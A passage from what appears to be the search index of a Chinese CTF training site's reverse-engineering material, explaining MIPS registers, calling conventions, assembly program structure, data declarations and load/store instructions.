\u7528\u4e8e\u5b58\u50a8\u4e58\u6cd5\u548c\u9664\u6cd5\u7684\u7ed3\u679c</li> <li>\u4e0d\u80fd\u76f4\u63a5\u5bfb\u5740; \u4f7f\u7528\u7279\u6b8a\u6307\u4ee4 <code>mfhi</code>\uff08 \u201c \u4ece Hi \u79fb\u52a8 \u201d \uff09\u548c <code>mflo</code>\uff08 \u201c \u4ece Lo \u79fb\u52a8 \u201d \uff09\u8bbf\u95ee\u7684\u5185\u5bb9</li> <li>\u6808\u4ece\u9ad8\u5230\u4f4e\u589e\u957f</li> </ul> \u5bc4\u5b58\u5668 \u522b\u540d \u7528\u9014 <code>$0</code> <code>$zero</code> \u5e38\u91cf0(constant value 0) <code>$1</code> <code>$at</code> \u4fdd\u7559\u7ed9\u6c47\u7f16\u5668(Reserved for assembler) <code>$2-$3</code> <code>$v0-$v1</code> \u51fd\u6570\u8c03\u7528\u8fd4\u56de\u503c(values for results and expression evaluation) <code>$4-$7</code> <code>$a0-$a3</code> \u51fd\u6570\u8c03\u7528\u53c2\u6570(arguments) <code>$8-$15</code> <code>$t0-$t7</code> \u6682\u65f6\u7684(\u6216\u968f\u4fbf\u7528\u7684) <code>$16-$23</code> <code>$s0-$s7</code> \u4fdd\u5b58\u7684(\u6216\u5982\u679c\u7528\uff0c\u9700\u8981SAVE/RESTORE\u7684)(saved) <code>$24-$25</code> <code>$t8-$t9</code> \u6682\u65f6\u7684(\u6216\u968f\u4fbf\u7528\u7684) <code>$26~$27</code> <code>$k0~$k1</code> \u4fdd\u7559\u4f9b\u4e2d\u65ad/\u9677\u9631\u5904\u7406\u7a0b\u5e8f\u4f7f\u7528 <code>$28</code> <code>$gp</code> \u5168\u5c40\u6307\u9488(Global Pointer) <code>$29</code> <code>$sp</code> \u5806\u6808\u6307\u9488(Stack Pointer) <code>$30</code> <code>$fp</code> \u5e27\u6307\u9488(Frame Pointer) <code>$31</code> <code>$ra</code> \u8fd4\u56de\u5730\u5740(return address) <p>\u518d\u6765\u8bf4\u4e00\u8bf4\u8fd9\u4e9b\u5bc4\u5b58\u5668 :</p> <ul> <li>zero \u5b83\u4e00\u822c\u4f5c\u4e3a\u6e90\u5bc4\u5b58\u5668\uff0c\u8bfb\u5b83\u6c38\u8fdc\u8fd4\u56de 0\uff0c\u4e5f\u53ef\u4ee5\u5c06\u5b83\u4f5c\u4e3a\u76ee\u7684\u5bc4\u5b58\u5668\u5199\u6570\u636e\uff0c\u4f46\u6548\u679c\u7b49\u4e8e\u767d\u5199\u3002\u4e3a\u4ec0\u4e48\u5355\u72ec\u62c9\u4e00\u4e2a\u5bc4\u5b58\u5668\u51fa\u6765\u8fd4\u56de\u4e00\u4e2a\u6570\u5b57\u5462\uff1f\u7b54\u6848\u662f\u4e3a\u4e86\u6548\u7387\uff0cMIPS \u7684\u8bbe\u8ba1\u8005\u53ea\u5141\u8bb8\u5728\u5bc4\u5b58\u5668\u5185\u6267\u884c\u7b97\u672f\u64cd\u4f5c\uff0c\u800c\u4e0d\u5141\u8bb8\u76f4\u63a5\u64cd\u4f5c\u7acb\u5373\u6570\u3002\u6240\u4ee5\u5bf9\u6700\u5e38\u7528\u7684\u6570\u5b57 0 \u5355\u72ec\u7559\u4e86\u4e00\u4e2a\u5bc4\u5b58\u5668\uff0c\u4ee5\u63d0\u9ad8\u6548\u7387</li> <li>at \u8be5\u5bc4\u5b58\u5668\u4e3a\u7ed9\u7f16\u8bd1\u5668\u4fdd\u7559\uff0c\u7528\u4e8e\u5904\u7406\u5728\u52a0\u8f7d 16 \u4f4d\u4ee5\u4e0a\u7684\u5927\u5e38\u6570\u65f6\u4f7f\u7528\uff0c\u7f16\u8bd1\u5668\u6216\u6c47\u7f16\u7a0b\u5e8f\u9700\u8981\u628a\u5927\u5e38\u6570\u62c6\u5f00\uff0c\u7136\u540e\u91cd\u65b0\u7ec4\u5408\u5230\u5bc4\u5b58\u5668\u91cc\u3002\u7cfb\u7edf\u7a0b\u5e8f\u5458\u4e5f\u53ef\u4ee5\u663e\u5f0f\u7684\u4f7f\u7528\u8fd9\u4e2a\u5bc4\u5b58\u5668\uff0c\u6709\u4e00\u4e2a\u6c47\u7f16 directive \u53ef\u88ab\u7528\u6765\u7981\u6b62\u6c47\u7f16\u5668\u5728 directive \u4e4b\u540e\u518d\u4f7f\u7528 at \u5bc4\u5b58\u5668\u3002</li> <li>v0, v1.\u8fd9\u4e24\u4e2a\u5f88\u7b80\u5355\uff0c\u7528\u505a\u51fd\u6570\u7684\u8fd4\u56de\u503c\uff0c\u5927\u90e8\u5206\u65f6\u5019\uff0c\u4f7f\u7528 v0 \u5c31\u591f\u4e86\u3002\u5982\u679c\u8fd4\u56de\u503c\u7684\u5927\u5c0f\u8d85\u8fc7 8 \u5b57\u8282\uff0c\u90a3\u5c31\u9700\u8981\u5206\u914d\u4f7f\u7528\u5806\u6808\uff0c\u8c03\u7528\u8005\u5728\u5806\u6808\u91cc\u5206\u914d\u4e00\u4e2a\u533f\u540d\u7684\u7ed3\u6784\uff0c\u8bbe\u7f6e\u4e00\u4e2a\u6307\u5411\u8be5\u53c2\u6570\u7684\u6307\u9488\uff0c\u8fd4\u56de\u65f6 v0 \u6307\u5411\u8fd9\u4e2a\u5bf9\u5e94\u7684\u7ed3\u6784\uff0c\u8fd9\u4e9b\u90fd\u662f\u7531\u7f16\u8bd1\u5668\u81ea\u52a8\u5b8c\u6210\u3002</li> <li>a0-a3. \u7528\u6765\u4f20\u9012\u51fd\u6570\u5165\u53c2\u7ed9\u5b50\u51fd\u6570\u3002\u770b\u4e00\u4e0b\u8fd9\u4e2a\u4f8b\u5b50\uff1a <code>ret = strncmp(\"bear\",\"bearer\",4)</code> \u53c2\u6570\u5c11\u4e8e 16 \u5b57\u8282\uff0c\u53ef\u4ee5\u653e\u5165\u5bc4\u5b58\u5668\u4e2d\uff0c\u5728 strncmp \u7684\u51fd\u6570\u91cc\uff0ca0 \u5b58\u653e\u7684\u662f \"bear\" \u8fd9\u4e2a\u5b57\u7b26\u4e32\u6240\u5728\u7684\u53ea\u8bfb\u533a\u5730\u5740\uff0ca1 \u662f \"bearer\" \u7684\u5730\u5740\uff0ca2 \u662f 4.</li> <li>t0-t9 \u4e34\u65f6\u5bc4\u5b58\u5668 s0-s8 \u4fdd\u7559\u5bc4\u5b58\u5668 \u8fd9\u4e24\u79cd\u5bc4\u5b58\u5668\u9700\u8981\u653e\u5728\u4e00\u8d77\u8bf4\uff0c\u5b83\u4eec\u662f mips \u6c47\u7f16\u91cc\u9762\u4ee3\u7801\u91cc\u89c1\u5230\u7684\u6700\u591a\u7684\u4e24\u79cd\u5bc4\u5b58\u5668\uff0c\u5b83\u4eec\u7684\u4f5c\u7528\u90fd\u662f\u5b58\u53d6\u6570\u636e\uff0c\u505a\u8ba1\u7b97\u3001\u79fb\u4f4d\u3001\u6bd4\u8f83\u3001\u52a0\u8f7d\u3001\u5b58\u50a8\u7b49\u7b49\uff0c\u533a\u522b\u5728\u4e8e\uff0ct0-t9 \u5728\u5b50\u7a0b\u5e8f\u4e2d\u53ef\u4ee5\u4f7f\u7528\u5176\u4e2d\u7684\u503c\uff0c\u5e76\u4e0d\u5fc5\u5b58\u50a8\u5b83\u4eec\uff0c\u5b83\u4eec\u5f88\u9002\u5408\u7528\u6765\u5b58\u653e\u8ba1\u7b97\u8868\u8fbe\u5f0f\u65f6\u4f7f\u7528\u7684\u201c\u4e34\u65f6\u201d\u53d8\u91cf\u3002\u5982\u679c\u8fd9\u4e9b\u53d8\u91cf\u7684\u4f7f\u7528\u8981\u8981\u8df3\u8f6c\u5230\u5b50\u51fd\u6570\u4e4b\u524d\u5b8c\u6210\uff0c\u56e0\u4e3a\u5b50\u51fd\u6570\u91cc\u5f88\u53ef\u80fd\u4f1a\u4f7f\u7528\u76f8\u540c\u7684\u5bc4\u5b58\u5668\uff0c\u800c\u4e14\u4e0d\u4f1a\u6709\u4efb\u4f55\u4fdd\u62a4\u3002\u5982\u679c\u5b50\u7a0b\u5e8f\u91cc\u4e0d\u4f1a\u8c03\u7528\u5176\u5b83\u51fd\u6570\u90a3\u4e48\u5efa\u8bae\u5c3d\u91cf\u591a\u7684\u4f7f\u7528t0-t9\uff0c\u8fd9\u6837\u53ef\u4ee5\u907f\u514d\u51fd\u6570\u5165\u53e3\u5904\u7684\u4fdd\u5b58\u548c\u7ed3\u675f\u65f6\u7684\u6062\u590d\u3002 \u76f8\u53cd\u7684\uff0cs0-s8 \u5728\u5b50\u7a0b\u5e8f\u7684\u6267\u884c\u8fc7\u7a0b\u4e2d\uff0c\u9700\u8981\u5c06\u5b83\u4eec\u5b58\u50a8\u5728\u5806\u6808\u91cc\uff0c\u5e76\u5728\u5b50\u7a0b\u5e8f\u7ed3\u675f\u524d\u6062\u590d\u3002\u4ece\u800c\u5728\u8c03\u7528\u51fd\u6570\u770b\u6765\u8fd9\u4e9b\u5bc4\u5b58\u5668\u7684\u503c\u6ca1\u6709\u53d8\u5316\u3002</li> <li>k0, k1. \u8fd9\u4e24\u4e2a\u5bc4\u5b58\u5668\u662f\u4e13\u95e8\u9884\u7559\u7ed9\u5f02\u5e38\u5904\u7406\u6d41\u7a0b\u4e2d\u4f7f\u7528\u3002\u5f02\u5e38\u5904\u7406\u6d41\u7a0b\u4e2d\u6709\u4ec0\u4e48\u7279\u522b\u7684\u5730\u65b9\u5417\uff1f\u5f53\u7136\u3002\u5f53 MIPS CPU \u5728\u4efb\u52a1\u91cc\u8fd0\u884c\u7684\u65f6\u5019\uff0c\u4e00\u65e6\u6709\u5916\u90e8\u4e2d\u65ad\u6216\u8005\u5f02\u5e38\u53d1\u751f\uff0cCPU \u5c31\u4f1a\u7acb\u523b\u8df3\u8f6c\u5230\u4e00\u4e2a\u56fa\u5b9a\u5730\u5740\u7684\u5f02\u5e38 handler \u51fd\u6570\u6267\u884c\uff0c\u5e76\u540c\u65f6\u5c06\u5f02\u5e38\u7ed3\u675f\u540e\u8fd4\u56de\u5230\u4efb\u52a1\u7684\u6307\u4ee4\u5730\u5740\u8bb0\u5f55\u5728 EPC \u5bc4\u5b58\u5668\uff08Exception Program Counter\uff09\u91cc\u3002\u4e60\u60ef\u6027\u7684\uff0c\u5f02\u5e38 handler \u51fd\u6570\u5f00\u5934\u603b\u662f\u4f1a\u4fdd\u6301\u73b0\u573a\u5373 MIPS \u5bc4\u5b58\u5668\u5230\u4e2d\u65ad\u6808\u7a7a\u95f4\u91cc\uff0c\u800c\u5728\u5f02\u5e38\u8fd4\u56de\u524d\uff0c\u518d\u628a\u8fd9\u4e9b\u5bc4\u5b58\u5668\u7684\u503c\u6062\u590d\u56de\u53bb\u3002\u90a3\u5c31\u5b58\u5728\u4e00\u4e2a\u95ee\u9898\uff0c\u8fd9\u4e2a EPC \u91cc\u7684\u503c\u5b58\u653e\u5728\u54ea\u91cc\uff1f\u5f02\u5e38 handler \u51fd\u6570\u7684\u6700\u540e\u80af\u5b9a\u662f\u4e00\u53e5 <code>jr x</code>\uff0cX \u662f\u4e00\u4e2a MIPS \u5bc4\u5b58\u5668\uff0c\u5982\u679c\u5b58\u653e\u5728\u524d\u9762\u63d0\u5230\u7684 t0,s0 \u7b49\u7b49\uff0c\u90a3\u4e48 PC \u8df3\u56de\u4efb\u52a1\u6267\u884c\u73b0\u573a\u65f6\uff0c\u8fd9\u4e2a\u5bc4\u5b58\u5668\u91cc\u7684\u503c\u5c31\u4e0d\u518d\u662f\u5f02\u5e38\u53d1\u751f\u4e4b\u524d\u7684\u503c\u3002\u6240\u4ee5\u5fc5\u987b\u8981\u6709\u65f6\u5c31\u53ef\u4ee5\u4e00\u53e5 <code>jr k0</code>\u6307\u4ee4\u8fd4\u56de\u4e86\u3002 k1 \u662f\u53e6\u5916\u4e00\u4e2a\u4e13\u4e3a\u5f02\u5e38\u800c\u751f\u7684\u5bc4\u5b58\u5668\uff0c\u5b83\u53ef\u4ee5\u7528\u6765\u8bb0\u5f55\u4e2d\u65ad\u5d4c\u5957\u7684\u6df1\u5ea6\u3002CPU \u5728\u6267\u884c\u4efb\u52a1\u7a7a\u95f4\u7684\u4ee3\u7801\u65f6\uff0ck1 \u5c31\u53ef\u4ee5\u7f6e\u4e3a 0\uff0c\u8fdb\u5165\u5230\u4e2d\u65ad\u7a7a\u95f4\uff0c\u6bcf\u8fdb\u5165\u4e00\u6b21\u5c31\u52a0 1\uff0c\u9000\u51fa\u4e00\u6b21\u76f8\u5e94\u51cf 1\uff0c\u8fd9\u6837\u5c31\u53ef\u4ee5\u8bb0\u5f55\u4e2d\u65ad\u5d4c\u5957\u7684\u6df1\u5ea6\u3002\u8fd9\u4e2a\u6df1\u5ea6\u5728\u8c03\u8bd5\u95ee\u9898\u7684\u65f6\u5019\u7ecf\u5e38\u4f1a\u7528\u5230\uff0c\u540c\u65f6\u5e94\u7528\u7a0b\u5e8f\u5728\u505a\u4e00\u6b21\u4e8b\u60c5\u7684\u65f6\u5019\u53ef\u80fd\u4f1a\u9700\u8981\u77e5\u9053\u5f53\u524d\u662f\u5728\u4efb\u52a1\u8fd8\u662f\u4e2d\u65ad\u4e0a\u4e0b\u6587\uff0c\u8fd9\u65f6\uff0c\u4e5f\u53ef\u4ee5\u901a\u8fc7 k1 \u5bc4\u5b58\u5668\u662f\u5426\u4e3a 0 \u6765\u5224\u65ad\u3002</li> <li>sp \u6307\u5411\u5f53\u524d\u6b63\u5728\u64cd\u4f5c\u7684\u5806\u6808\u9876\u90e8\uff0c\u5b83\u6307\u5411\u5806\u6808\u4e2d\u7684\u4e0b\u4e00\u4e2a\u53ef\u5199\u5165\u7684\u5355\u5143\uff0c\u5982\u679c\u4ece\u6808\u9876\u83b7\u53d6\u4e00\u4e2a\u5b57\u8282\u662f sp-1 \u5730\u5740\u7684\u5185\u5bb9\u3002\u5728\u6709 RTOS \u7684\u7cfb\u7edf\u91cc\uff0c\u6bcf\u4e2a task \u90fd\u6709\u81ea\u5df1\u7684\u4e00\u4e2a\u5806\u6808\u7a7a\u95f4\u548c\u5b9e\u65f6 sp \u526f\u672c\uff0c\u4e2d\u65ad\u4e5f\u6709\u81ea\u5df1\u7684\u5806\u6808\u7a7a\u95f4\u548c sp \u526f\u672c\uff0c\u5b83\u4eec\u4f1a\u5728\u4e0a\u4e0b\u6587\u5207\u6362\u7684\u8fc7\u7a0b\u4e2d\u8fdb\u884c\u4fdd\u5b58\u548c\u6062\u590d\u3002</li> <li>gp \u8fd9\u662f\u4e00\u4e2a\u8f85\u52a9\u578b\u7684\u5bc4\u5b58\u5668\uff0c\u5176\u542b\u4e49\u8f83\u4e3a\u6a21\u7cca\uff0cMIPS \u5b98\u65b9\u4e3a\u8be5\u5bc4\u5b58\u5668\u63d0\u4f9b\u4e86\u4e24\u4e2a\u7528\u6cd5\u5efa\u8bae\uff0c\u4e00\u79cd\u662f\u6307\u5411 Linux \u5e94\u7528\u4e2d\u4f4d\u7f6e\u65e0\u5173\u4ee3\u7801\u4e4b\u5916\u7684\u6570\u636e\u5f15\u7528\u7684\u5168\u5c40\u504f\u79fb\u91cf\u8868\uff1b \u5728\u8fd0\u884c RTOS \u7684\u5c0f\u578b\u5d4c\u5165\u5f0f\u7cfb\u7edf\u4e2d\uff0c\u5b83\u53ef\u4ee5\u6307\u5411\u4e00\u5757\u8bbf\u95ee\u8f83\u4e3a\u9891\u7e41\u7684\u5168\u5c40\u6570\u636e\u533a\u57df\uff0c\u7531\u4e8eMIPS \u6c47\u7f16\u6307\u4ee4\u957f\u5ea6\u90fd\u662f 32bit\uff0c\u6307\u4ee4\u5185\u90e8\u7684 offset \u4e3a 16bit\uff0c\u4e14\u4e3a\u6709\u7b26\u53f7\u6570\uff0c\u6240\u4ee5\u80fd\u7528\u4e00\u6761\u6307\u4ee4\u4ee5 gp \u4e3a\u57fa\u5730\u5740\u8bbf\u95ee\u6b63\u8d1f 15bit \u7684\u5730\u5740\u7a7a\u95f4\uff0c\u63d0\u9ad8\u6548\u7387\u3002\u90a3\u4e48\u7f16\u8bd1\u5668\u600e\u4e48\u77e5\u9053gp\u521d\u59cb\u5316\u7684\u503c\u5462\uff1f\u53ea\u8981\u5728 link \u6587\u4ef6\u4e2d\u6dfb\u52a0 _gp \u7b26\u53f7\uff0c\u8fde\u63a5\u5668\u5c31\u4f1a\u8ba4\u4e3a\u8fd9\u662f gp \u7684\u503c\u3002\u6211\u4eec\u5728\u4e0a\u7535\u65f6\uff0c\u5c06 _gp \u7684\u503c\u8d4b\u7ed9 gp \u5bc4\u5b58\u5668\u5c31\u884c\u4e86\u3002 \u8bdd\u8bf4\u56de\u6765\uff0c\u8fd9\u90fd\u662f MIPS \u8bbe\u8ba1\u8005\u7684\u5efa\u8bae\uff0c\u4e0d\u662f\u5f3a\u5236\uff0c\u697c\u4e3b\u8fd8\u89c1\u8fc7\u4e00\u79cd gp \u5bc4\u5b58\u5668\u7684\u7528\u6cd5\uff0c\u6765\u5728\u4e2d\u65ad\u548c\u4efb\u52a1\u5207\u6362\u65f6\u505a sp \u7684\u5b58\u50a8\u8fc7\u6e21\uff0c\u4e5f\u662f\u53ef\u4ee5\u7684\u3002</li> <li>fp \u8fd9\u4e2a\u5bc4\u5b58\u5668\u4e0d\u540c\u7684\u7f16\u8bd1\u5668\u5bf9\u5176\u89e3\u91ca\u4e0d\u540c\uff0cGNU MIPS C \u7f16\u8bd1\u5668\u4f7f\u7528\u5176\u4f5c\u4e3a\u5e27\u6307\u9488\uff0c\u6307\u5411\u5806\u6808\u91cc\u7684\u8fc7\u7a0b\u5e27\uff08\u4e00\u4e2a\u5b50\u51fd\u6570\uff09\u7684\u7b2c\u4e00\u4e2a\u5b57\uff0c\u5b50\u51fd\u6570\u53ef\u4ee5\u7528\u5176\u505a\u4e00\u4e2a\u504f\u79fb\u8bbf\u95ee\u6808\u5e27\u91cc\u7684\u5c40\u90e8\u53d8\u91cf\uff0csp \u4e5f\u53ef\u4ee5\u8f83\u4e3a\u7075\u6d3b\u7684\u79fb\u52a8\uff0c\u56e0\u4e3a\u5728\u51fd\u6570\u9000\u51fa\u4e4b\u524d\u4f7f\u7528 fp \u6765\u6062\u590d\uff1b\u8fd8\u8981\u4e00\u79cd\u800c SGI \u7684 C \u7f16\u8bd1\u5668\u4f1a\u5c06\u8fd9\u4e2a\u5bc4\u5b58\u5668\u76f4\u63a5\u4f5c\u4e3a s8,\u6269\u5c55\u4e86\u4e00\u4e2a\u4fdd\u7559\u5bc4\u5b58\u5668\u7ed9\u7f16\u8bd1\u5668\u4f7f\u7528\u3002</li> <li>ra \u5728\u51fd\u6570\u8c03\u7528\u8fc7\u7a0b\u4e2d\uff0c\u4fdd\u6301\u5b50\u51fd\u6570\u8fd4\u56de\u540e\u7684\u6307\u4ee4\u5730\u5740\u3002\u6c47\u7f16\u8bed\u53e5\u91cc\u51fd\u6570\u8c03\u7528\u7684\u5f62\u5f0f\u4e3a\uff1a <code>jal function_X</code> \u8fd9\u6761\u6307\u4ee4 jal(jump-and-link,\u8df3\u8f6c\u5e76\u94fe\u63a5) \u6307\u4ee4\u4f1a\u5c06\u5f53\u671f\u6267\u884c\u8fd0\u884c\u6307\u4ee4\u7684\u5730\u5740 +4 \u5b58\u50a8\u5230 ra \u5bc4\u5b58\u5668\u91cc\uff0c\u7136\u540e\u8df3\u8f6c\u5230 function_X \u7684\u5730\u5740\u5904\u3002\u76f8\u5e94\u7684\uff0c\u5b50\u51fd\u6570\u8fd4\u56de\u65f6\uff0c\u6700\u5e38\u89c1\u7684\u4e00\u6761\u6307\u4ee4\u5c31\u662f <code>jr ra</code> ra \u662f\u4e00\u4e2a\u5bf9\u4e8e\u8c03\u8bd5\u5f88\u6709\u7528\u7684\u5bc4\u5b58\u5668\uff0c\u7cfb\u7edf\u7684\u8fd0\u884c\u7684\u4efb\u4f55\u65f6\u523b\u90fd\u53ef\u4ee5\u67e5\u770b\u5b83\u7684\u503c\u4ee5\u83b7\u53d6 CPU \u7684\u8fd0\u884c\u8f68\u8ff9\u3002</li> </ul> <p>\u6700\u540e\uff0c\u5982\u679c\u7eaf\u5199\u6c47\u7f16\u8bed\u53e5\u7684\u8bdd\uff0c\u8fd9\u4e9b\u5bc4\u5b58\u5668\u5f53\u4e2d\u9664\u4e86 zero \u4e4b\u5916\uff0c\u5176\u5b83\u7684\u57fa\u672c\u4e0a\u90fd\u53ef\u4ee5\u505a\u666e\u901a\u5bc4\u5b58\u5668\u5b58\u53d6\u6570\u636e\u4f7f\u7528\uff08\u8fd9\u4e5f\u662f\u5b83\u4eec\u4e3a\u4ec0\u4e48\u4f1a\u5b9a\u4e49\u4e3a\u201c\u901a\u7528\u5bc4\u5b58\u5668\u201d\uff0c\u800c\u4e0d\u50cf\u5176\u5b83\u7684\u534f\u5904\u7406\u5668\u3001\u6216\u8005\u5916\u8bbe\u7684\u90fd\u662f\u4e13\u7528\u5bc4\u5b58\u5668\uff0c\u5176\u5728\u51fa\u5382\u65f6\u6240\u6709\u7684\u529f\u80fd\u90fd\u662f\u5b9a\u6b7b\u7684\uff09\uff0c\u90a3\u4e3a\u4ec0\u4e48\u6709\u8fd9\u4e48\u591a\u89c4\u5219\u5462 \uff1fMIPS \u5f00\u53d1\u8005\u4eec\u4e3a\u4e86\u8ba9\u81ea\u5df1\u7684\u5904\u7406\u5668\u53ef\u4ee5\u8fd0\u884c\u50cf C\u3001Java \u8fd9\u6837\u7684\u9ad8\u7ea7\u8bed\u8a00\uff0c\u4ee5\u53ca\u8ba9\u6c47\u7f16\u8bed\u8a00\u548c\u9ad8\u7ea7\u8bed\u8a00\u53ef\u4ee5\u5b89\u5168\u7684\u6df7\u5408\u7f16\u7a0b\u800c\u8bbe\u8ba1\u7684\u4e00\u5957 ABI\uff08\u5e94\u7528\u7f16\u7a0b\u63a5\u53e3\uff09\uff0c\u4e0d\u540c\u7684\u7f16\u8bd1\u5668\u7684\u8bbe\u8ba1\u8005\u4eec\u5c31\u4f1a\u6709\u636e\u53ef\u4f9d\uff0c\u7cfb\u7edf\u7a0b\u5e8f\u5458\u4eec\u5728\u9605\u8bfb\u3001\u4fee\u6539\u6c47\u7f16\u7a0b\u5e8f\u7684\u65f6\u5019\u4e5f\u80fd\u6839\u636e\u8fd9\u4e9b\u7ea6\u5b9a\u800c\u66f4\u4e3a\u987a\u7545\u5730\u7406\u89e3\u6c47\u7f16\u4ee3\u7801\u7684\u542b\u4e49\u3002</p>"},{"location":"Training/Material/Reverse/#_17","title":"\u7a0b\u5e8f\u7ed3\u6784","text":"<ul> <li>\u672c\u8d28\u4e0a\u53ea\u662f\u5e26\u6709\u6570\u636e\u58f0\u660e\u7684\u7eaf\u6587\u672c\u6587\u4ef6\uff0c\u7a0b\u5e8f\u4ee3\u7801 ( \u6587\u4ef6\u540d\u5e94\u4ee5\u540e\u7f00 .s \u7ed3\u5c3e\uff0c\u6216\u8005.asm )</li> <li>\u6570\u636e\u58f0\u660e\u90e8\u5206\u540e\u8ddf\u7a0b\u5e8f\u4ee3\u7801\u90e8\u5206</li> </ul>"},{"location":"Training/Material/Reverse/#_18","title":"\u6570\u636e\u58f0\u660e","text":"<ul> <li>\u6570\u636e\u4ee5 <code>.data</code> \u4e3a\u6807\u8bc6</li> <li>\u58f0\u660e\u53d8\u91cf\u540e\uff0c\u5373\u5728\u5185\u5b58\u4e2d\u5206\u914d\u7a7a\u95f4</li> </ul>"},{"location":"Training/Material/Reverse/#_19","title":"\u4ee3\u7801","text":"<ul> <li>\u653e\u5728\u7528\u6c47\u7f16\u6307\u4ee4 <code>.text</code> \u6807\u8bc6\u7684\u6587\u672c\u90e8\u5206\u4e2d</li> <li>\u5305\u542b\u7a0b\u5e8f\u4ee3\u7801\uff08 \u6307\u4ee4 \uff09</li> <li>\u7ed9\u5b9a\u6807\u7b7e <code>main</code> \u4ee3\u7801\u6267\u884c\u7684\u8d77\u70b9 ( \u548c C \u8bed\u8a00\u4e00\u6837 )</li> <li>\u7a0b\u5e8f\u7ed3\u675f\u6807\u5fd7\uff08\u89c1\u4e0b\u9762\u7684\u7cfb\u7edf\u8c03\u7528\uff09</li> </ul>"},{"location":"Training/Material/Reverse/#_20","title":"\u6ce8\u91ca","text":"<ul> <li>\uff03 \u8868\u793a\u5355\u884c\u6ce8\u91ca</li> </ul> <p>\uff03 \u540e\u9762\u7684\u4efb\u4f55\u5185\u5bb9\u90fd\u4f1a\u88ab\u89c6\u4e3a\u6ce8\u91ca</p> <ul> <li>MIPS \u6c47\u7f16\u8bed\u8a00\u7a0b\u5e8f\u7684\u6a21\u677f\uff1a</li> </ul> <pre><code>\uff03\u7ed9\u51fa\u7a0b\u5e8f\u540d\u79f0\u548c\u529f\u80fd\u63cf\u8ff0\u7684\u6ce8\u91ca\n\uff03Template.s\n#MIPS\u6c47\u7f16\u8bed\u8a00\u7a0b\u5e8f\u7684Bare-bones\u6982\u8ff0\n\n            .data #\u53d8\u91cf\u58f0\u660e\u9075\u5faa\u8fd9\u4e00\u884c\n                        \uff03...\n            .text\uff03\u6307\u4ee4\u8ddf\u968f\u8fd9\u4e00\u884c\n\n main\uff1a\uff03\u8868\u793a\u4ee3\u7801\u7684\u5f00\u59cb\uff08\u6267\u884c\u7684\u7b2c\u4e00\u6761\u6307\u4ee4\uff09\n                        \uff03...\n\n\uff03\u7a0b\u5e8f\u7ed3\u675f\uff0c\u4e4b\u540e\u7559\u7a7a\uff0c\u8ba9SPIM\u6ee1\u610f.\n</code></pre>"},{"location":"Training/Material/Reverse/#_21","title":"\u53d8\u91cf\u58f0\u660e","text":"<p>\u58f0\u660e\u683c\u5f0f\uff1a</p> <pre><code>name\uff1astorage_type value\uff08s\uff09\n</code></pre> <p>\u4f7f\u7528\u7ed9\u5b9a\u540d\u79f0\u548c\u6307\u5b9a\u503c\u4e3a\u6307\u5b9a\u7c7b\u578b\u7684\u53d8\u91cf\u521b\u5efa\u7a7a\u95f4</p> <p>value (s) \u901a\u5e38\u7ed9\u51fa\u521d\u59cb\u503c; \u5bf9\u4e8e.space\uff0c\u7ed9\u51fa\u8981\u5206\u914d\u7684\u7a7a\u683c\u6570</p> <p>\u6ce8\u610f\uff1a\u6807\u7b7e\u540e\u9762\u8ddf\u5192\u53f7\uff08:)</p> <ul> <li>\u4f8b\u5982</li> </ul> <pre><code>var1\uff1a.word 3 \uff03\u521b\u5efa\u4e00\u4e2a\u521d\u59cb\u503c\u4e3a 3 \u7684\u6574\u6570\u53d8\u91cf\narray1\uff1a.byte'a'\uff0c'b' \uff03\u521b\u5efa\u4e00\u4e2a\u5143\u7d20\u521d\u59cb\u5316\u7684 2 \u5143\u7d20\u5b57\u7b26\u6570\u7ec4\u5230 a \u548c b\n\narray2\uff1a.space 40  #\u5206\u914d 40 \u4e2a\u8fde\u7eed\u5b57\u8282, \u672a\u521d\u59cb\u5316\u7684\u7a7a\u95f4\u53ef\u4ee5\u7528\u4f5c 40 \u4e2a\u5143\u7d20\u7684\u5b57\u7b26\u6570\u7ec4, \u6216\u8005\u662f\n                                   #10 \u4e2a\u5143\u7d20\u7684\u6574\u6570\u6570\u7ec4.\n</code></pre>"},{"location":"Training/Material/Reverse/#loadstore","title":"\u8bfb\u53d6/\u5199\u5165 ( Load/Store )\u6307\u4ee4","text":"<ul> <li>\u5bf9 RAM \u7684\u8bbf\u95ee, \u4ec5\u5141\u8bb8\u4f7f\u7528\u52a0\u8f7d\u548c\u5b58\u50a8\u6307\u4ee4 ( \u5373 <code>load</code> \u6216\u8005 <code>store</code>)</li> <li>\u6240\u6709\u5176\u4ed6\u6307\u4ee4\u90fd\u4f7f\u7528\u5bc4\u5b58\u5668\u53c2\u6570</li> </ul> <p><code>load</code>\uff1a</p> <pre><code>lw register_destination\uff0cRAM_source\n#\u5c06\u6e90\u5185\u5b58\u5730\u5740\u7684\u5b57 ( 4 \u4e2a\u5b57\u8282 ) \u590d\u5236\u5230\u76ee\u6807\u5bc4\u5b58\u5668,\uff08lw\u4e2d\u7684'w'\u610f\u4e3a'word',\u5373\u8be5\u6570\u636e\u5927\u5c0f\u4e3a4\u4e2a\u5b57\u8282\uff09\nlb register_destination\uff0cRAM_source\n#\u5c06\u6e90\u5185\u5b58\u5730\u5740\u7684\u5b57\u8282\u590d\u5236\u5230\u76ee\u6807\u5bc4\u5b58\u5668\u7684\u4f4e\u4f4d\u5b57\u8282, \u5e76\u5c06\u7b26\u53f7\u6620\u5c04\u5230\u9ad8\u4f4d\u5b57\u8282 ( \u540c\u4e0a, lb \u610f\u4e3a load byte )\n</code></pre> <p><code>store</code>\uff1a</p> <pre><code>sw register_source\uff0cRAM_destination\n#\u5c06\u6e90\u5bc4\u5b58\u5668\u7684\u5b57\u5b58\u50a8\u5230\u76ee\u6807\u5185\u5b58RAM\u4e2d\nsb register_source\uff0cRAM_destination\n#\u5c06\u6e90\u5bc4\u5b58\u5668\u4e2d\u7684\u4f4e\u4f4d\u5b57\u8282\u5b58\u50a8\u5230\u76ee\u6807\u5185\u5b58RAM\u4e2d\n</code></pre> <p>\u7acb\u5373\u52a0\u8f7d\uff1a</p> <pre><code>li register_destination\uff0cvalue\n#\u628a\u7acb\u5373\u503c\u52a0\u8f7d\u5230\u76ee\u6807\u5bc4\u5b58\u5668\u4e2d,\u987e\u540d\u601d\u4e49, \u8fd9\u91cc\u7684 li \u610f\u4e3a load immediate, \u5373\u7acb\u5373\u52a0\u8f7d.\n</code></pre> <ul> <li>\u4f8b\u5b50</li> </ul> <pre><code>       .data\nvar1:  .word  23            # \u7ed9\u53d8\u91cf var1 \u5728\u5185\u5b58\u4e2d\u5f00\u8f9f\u7a7a\u95f4, \u53d8\u91cf\u521d\u59cb\u503c\u4e3a 23\n\n       